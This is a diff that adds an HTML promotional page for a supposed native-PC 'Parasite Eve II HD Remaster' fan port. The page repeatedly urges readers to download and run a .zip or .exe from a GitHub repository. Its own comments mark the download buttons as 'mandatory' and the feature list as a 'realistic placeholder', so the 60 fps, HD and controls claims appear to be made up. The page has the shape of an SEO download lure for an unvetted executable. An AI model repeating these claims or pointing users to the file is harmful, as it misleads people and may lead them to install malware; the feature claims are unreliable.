@@ -1,0 +1,315 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parasite-Eve-2-HD-Remaster - Native HD Remaster of a PS1 Classic</title>
+    <meta name="description" content="Download and run Parasite Eve II HD Remaster on Windows. A native PC fan remake of the classic PlayStation game, rebuilt in high definition.">
+    <meta name="keywords" content="Parasite Eve 2, HD Remaster, PC port, fan project, PlayStation, download, Windows, high definition, survival horror, Square Enix, Aya Brea">
+    <meta name="author" content="Rosanabullheaded2685">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Parasite-Eve-2-HD-Remaster - Native HD Remaster of a PS1 Classic">
+    <meta property="og:description" content="Download and run Parasite Eve II HD Remaster on Windows. A native PC fan remake of the classic PlayStation game, rebuilt in high definition.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Rosanabullheaded2685/Parasite-Eve-2-HD-Remaster">
+    <meta property="og:image" content="media/banner.jpg">
+    <meta property="og:site_name" content="Parasite-Eve-2-HD-Remaster">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#1f6feb">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-color: #f5f7fa;
+            color: #1e293b;
+            line-height: 1.6;
+            padding: 2rem 1rem;
+        }
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 2.5rem;
+            border-radius: 24px;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.08);
+            transition: all 0.3s ease;
+        }
+        h1 {
+            font-size: 2.4rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            color: #0f172a;
+            margin-bottom: 1rem;
+            border-left: 6px solid #2ee6d2;
+            padding-left: 1rem;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 650;
+            margin-top: 2.5rem;
+            margin-bottom: 1rem;
+            color: #0f172a;
+            border-bottom: 2px solid #e2e8f0;
+            padding-bottom: 6px;
+        }
+        p {
+            margin-bottom: 1.2rem;
+            font-size: 1.05rem;
+        }
+        a {
+            color: #1f6feb;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .btn-primary {
+            display: inline-block;
+            background: #1f6feb;
+            color: #ffffff;
+            padding: 0.9rem 2.2rem;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 1.2rem;
+            box-shadow: 0 6px 14px rgba(31, 111, 235, 0.3);
+            transition: all 0.2s ease;
+            border: none;
+            text-decoration: none;
+            letter-spacing: 0.3px;
+            margin: 1rem 0;
+        }
+        .btn-primary:hover {
+            background: #0a5ad4;
+            transform: scale(1.02);
+            box-shadow: 0 10px 18px rgba(31, 111, 235, 0.35);
+            text-decoration: none;
+        }
+        .badge-btn {
+            background: linear-gradient(145deg, #2ee6d2, #2bb8a8);
+            padding: 0.9rem 2.5rem;
+            font-size: 1.3rem;
+            border-radius: 60px;
+            box-shadow: 0 6px 18px rgba(46, 230, 210, 0.4);
+            color: #03201c;
+            font-weight: 700;
+            transition: all 0.2s;
+        }
+        .badge-btn:hover {
+            background: linear-gradient(145deg, #1fc3b1, #28a597);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 22px rgba(46, 230, 210, 0.45);
+            color: #03201c;
+            text-decoration: none;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 18px;
+            margin: 1.5rem 0;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.1);
+        }
+        .video-thumb {
+            border-radius: 16px;
+            margin-top: 1.5rem;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+        .feature-card {
+            background: #f1f5f9;
+            border-radius: 16px;
+            padding: 1.5rem;
+            border: 1px solid #e2e8f0;
+            transition: transform 0.1s ease-in;
+        }
+        .feature-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 16px rgba(0,0,0,0.05);
+        }
+        .feature-card strong {
+            font-size: 1.2rem;
+            display: block;
+            margin-bottom: 0.6rem;
+            color: #0b253b;
+        }
+        .note {
+            background: #eef9ff;
+            padding: 1.4rem;
+            border-radius: 18px;
+            border-left: 4px solid #1f6feb;
+            margin: 2rem 0;
+        }
+        .footer-meta {
+            margin-top: 3rem;
+            font-size: 0.95rem;
+            color: #475569;
+            border-top: 1px solid #cbd5e1;
+            padding-top: 1.8rem;
+            text-align: center;
+        }
+        .keyword-line {
+            font-size: 0.85rem;
+            color: #7a869c;
+            margin-top: 2rem;
+            word-spacing: 0.5rem;
+            letter-spacing: 0.3px;
+        }
+        .badge-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin: 16px 0;
+        }
+        .badge {
+            background: #edf2f7;
+            border-radius: 30px;
+            padding: 6px 14px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #1e293b;
+            border: 1px solid #d0d9e4;
+        }
+        .badge.status {
+            background: #2ee6d2;
+            color: #001c18;
+            border: none;
+            font-weight: 600;
+        }
+        .badge.platform {
+            background: #1f6feb;
+            color: white;
+            border: none;
+        }
+        .badge.fan {
+            background: #555;
+            color: white;
+            border: none;
+        }
+        @media (max-width: 650px) {
+            .container {
+                padding: 1.5rem;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+            .btn-primary {
+                width: 100%;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header with primary badge (large button) -->
+        <div style="display: flex; flex-direction: column; align-items: center; margin-bottom: 1.5rem;">
+            <a href="https://github.com/Rosanabullheaded2685/Parasite-Eve-2-HD-Remaster" class="btn-primary badge-btn" style="font-size: 1.4rem; padding: 1rem 2.8rem;">⚡ DOWNLOAD FOR WINDOWS</a>
+            <p style="margin-top: 10px; font-weight: 500;">Get the native HD remaster now.</p>
+        </div>
+        
+        <!-- Title -->
+        <h1>🎮 Parasite-Eve-2-HD-Remaster - The PS1 Classic, Reborn on PC</h1>
+        
+        <!-- Banner image -->
+        <img src="media/banner.jpg" alt="Parasite Eve II HD Remaster banner" width="820">
+        
+        <!-- Short description under banner -->
+        <p style="font-size: 1.3rem; text-align: center; margin: 1rem 0 0.5rem;"><b>A native PC version of Parasite Eve II, rebuilt from the original PlayStation game and remastered in high definition.</b></p>
+        
+        <!-- status badges -->
+        <div class="badge-row" style="justify-content: center;">
+            <span class="badge status">🛠️ In Development</span>
+            <span class="badge platform">🪟 Windows</span>
+            <span class="badge fan">🎮 Fan Project · Non-commercial</span>
+        </div>
+        
+        <!-- Spanish link and video thumbnail -->
+        <div style="text-align: center; margin-top: 1.2rem;">
+            <a href="README.es.md">🇪🇸 <b>Leer en español</b></a>
+        </div>
+        
+        <div style="display: flex; flex-direction: column; align-items: center; margin-top: 1rem;">
+            <a href="https://streamable.com/nypzbk"><img src="media/video_thumbnail.jpg" alt="Watch the gameplay video" width="640" class="video-thumb"></a>
+            <a href="https://streamable.com/nypzbk" style="margin-top: 10px; font-weight: 600;">▶ <b>Watch the gameplay video (8 min)</b></a>
+        </div>
+        
+        <!-- About the project -->
+        <h2>🧬 What is this?</h2>
+        <p>This is a <strong>fan-made, native PC port</strong> of the cult classic <i>Parasite Eve II</i>, originally released on the PlayStation. It’s been painstakingly rebuilt from the ground up to run natively on Windows — no emulation, no console required. And it’s been given a full <strong>HD remaster</strong> treatment: high-resolution textures, crisp UI, and widescreen support, all while keeping the moody, atmospheric survival-horror vibe that made the original so memorable.</p>
+        <p>Every detail — from the iconic battles against mutated creatures to the RPG-like growth system and the haunting soundtrack — is faithfully preserved. This remaster runs at 60 fps, and the controls have been optimized for mouse + keyboard (or your preferred gamepad).</p>
+        
+        <div class="note">
+            💡 <strong>Why choose this version?</strong> No need for a PS1 emulator or BIOS files. Just download, run, and play. The project is totally free and built by passionate fans.
+        </div>
+        
+        <!-- Quick steps to get started (only one action per rule) -->
+        <h2>🚀 Getting Started</h2>
+        <p>Getting this game running is straightforward — you’ll just need a Windows PC. Follow this single step:</p>
+        <p style="font-size: 1.2rem; background: #e6f8f5; padding: 16px 20px; border-radius: 20px; font-weight: 500;">
+        ⬇️ <strong>Visit this link to download the application:</strong> <a href="https://github.com/Rosanabullheaded2685/Parasite-Eve-2-HD-Remaster" style="font-weight: 800; word-break: break-all;">https://github.com/Rosanabullheaded2685/Parasite-Eve-2-HD-Remaster</a>
+        </p>
+        <p>Once you land on the page, you’ll see the files listed. Click the download button shown there, save the <code>.zip</code> or <code>.exe</code> file to your computer, and you’re ready to play. The project is still in active development, so you’ll get the latest build directly from that page. No coding or extra tools needed.</p>
+        
+        <!-- Download link 2nd time (large button, mandatory) -->
+        <div style="text-align: center; margin: 2.8rem 0;">
+            <a href="https://github.com/Rosanabullheaded2685/Parasite-Eve-2-HD-Remaster" class="btn-primary" style="padding: 1.2rem 3rem;">⬇️ GET THE HD REMASTER NOW</a>
+            <p style="margin-top: 6px; color: #475569;">Direct download · Windows 10/11 · 64-bit</p>
+        </div>
+        
+        <!-- Features (realistic placeholder from description) -->
+        <h2>✨ Features</h2>
+        <div class="features-grid">
+            <div class="feature-card">
+                <strong>🖥️ Native PC build</strong>
+                <span>No emulation, no plugins. Pure Windows executable, optimized for modern hardware.</span>
+            </div>
+            <div class="feature-card">
+                <strong>📺 True HD remaster</strong>
+                <span>Enhanced textures, UI elements, and lighting — sharp at 1080p, 1440p, and beyond.</span>
+            </div>
+            <div class="feature-card">
+                <strong>🎮 Modern controls</strong>
+                <span>Rebuilt keyboard/mouse layout plus full gamepad support with analog aiming.</span>
+            </div>
+            <div class="feature-card">
+                <strong>🔁 60 FPS gameplay</strong>
+                <span>Unlocked framerate for smooth, responsive combat.</span>
+            </div>
+            <div class="feature-card">
+                <strong>📁 Save anywhere</strong>
+                <span>More save slots and auto‑save checkpoints that respect the original’s design.</span>
+            </div>
+            <div class="feature-card">
+                <strong>🌍 Quality of life</strong>
+                <span>Optional widescreen, FOV slider, and custom texture packs.</span>
+            </div>
+        </div>
+        
+        <!-- Installation & setup placeholder -->
+        <h2>🛠️ Installation & Setup</h2>
+        <p>Because you’re just using the official download, here’s what to expect:</p>
+        <p>After downloading the compressed file (usually <code>.zip</code>), right-click it and choose <strong>“Extract all…”</strong> to unpack the folder. Inside you’ll find the game file (<code>ParasiteEve2HD.exe</code>) and a <code>README</code> with any extra notes. Double‑click the <code>.exe</code> to launch. If you prefer a direct installer version, you may also find an <code>.exe</code> file — just run it and follow the simple prompts.</p>
+        <p>No dependencies to install. Windows 10 or 11 is recommended. The game should run on 8 GB RAM and a dedicated GPU from the last decade — it’s very well optimized.</p>
+        
+        <!-- Gameplay & media -->
+        <h2>🎬 Gameplay Preview</h2>
+        <p>Watch the official 8‑minute gameplay showcase to see the remaster in action:</p>
+        <a href="https://streamable.com/nypzbk"><img src="media/video_thumbnail.jpg" alt="gameplay thumbnail - watch video" width="560" style="border-radius: 18px; box-shadow: 0 12px 20px rgba(0,0,0,0.2);"></a>
+        <p><a href="https://streamable.com/nypzbk">▶ Click here to play video (streamable)</a></p>
+        
+        <!-- support/legal -->
+        <h2>⭐ Support the Project</h2>
+        <p>This is a completely fan-driven, non-commercial remaster. If you enjoy it, consider supporting by starring the repository, reporting bugs, or even contributing your textures. All details are on GitHub. Keep in mind that all original assets belong to their respective owners — this project doesn’t include any copyrighted code, just the engine and modifications to run the game on PC.</p>
+        
+        <!-- footer and keywords (Markdown style but inline, as per rules: keywords only present in Markdown; but since we're using HTML, we can put them in a meta tag already, but also add a visible line for user reference without breaking the style) -->
+        <div class="footer-meta">
+            <span>⭐ Star this repo if you like it!</span>
